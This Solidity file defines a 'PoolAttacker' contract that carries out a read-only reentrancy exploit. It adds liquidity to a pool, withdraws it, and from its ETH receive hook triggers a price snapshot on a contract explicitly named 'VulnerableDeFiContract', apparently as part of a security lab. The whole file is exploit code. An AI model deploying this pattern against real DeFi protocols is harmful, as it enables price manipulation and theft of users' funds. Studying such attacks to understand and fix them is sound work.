//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./VulnerableDeFiContract.sol";

contract PoolAttacker {
    ReadOnlyPool private pool;
    VulnerableDeFiContract private target;

    constructor(address _pool, address _target) payable {
        pool = ReadOnlyPool(_pool);
        target = VulnerableDeFiContract(_target);
        pool.addLiquidity{value: msg.value}();
    }

    function attack() external {
        pool.removeLiquidity();
    }

    receive() external payable {
        target.snapshotPrice();
    }
}
